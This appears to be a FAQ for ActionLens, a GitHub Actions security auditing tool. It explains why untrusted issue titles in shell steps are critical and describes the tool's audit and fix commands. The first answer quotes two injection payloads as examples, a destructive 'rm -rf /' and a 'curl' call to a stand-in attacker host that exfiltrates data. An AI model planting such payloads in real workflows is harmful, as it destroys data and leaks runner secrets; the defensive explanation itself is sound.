# ActionLens FAQ & Troubleshooting Guide

Frequently asked questions regarding GitHub Actions security auditing, DAG topology, and pipeline optimization.

Author: [Jatin Sharma](https://jatinsh.netlify.app/) (`@raghav1924`)

---

### Q: Why does ActionLens flag `${{ github.event.issue.title }}` as CRITICAL?
**A:** When untrusted context variables are evaluated directly in bash commands, an attacker can format the issue title with shell metacharacters (e.g. `; rm -rf / ;` or `$(curl evil.com/steal)`). Because the bash shell interpolates the string before executing, the attacker's payload executes as raw commands with runner privileges.

---

### Q: What is the difference between `actionlens audit` and `actionlens fix`?
**A:**
- `actionlens audit`: Runs non-destructive static analysis and outputs a security health report (0-100%) with severity grades and remediation guides.
- `actionlens fix`: Automatically writes safe permissions blocks, concurrency cancellation groups, and job timeouts directly into your workflow YAML.

---

### Q: Does ActionLens send my workflow files or secrets to any external server?
**A:** **No.** ActionLens runs 100% locally with zero external npm dependencies and zero external network calls.

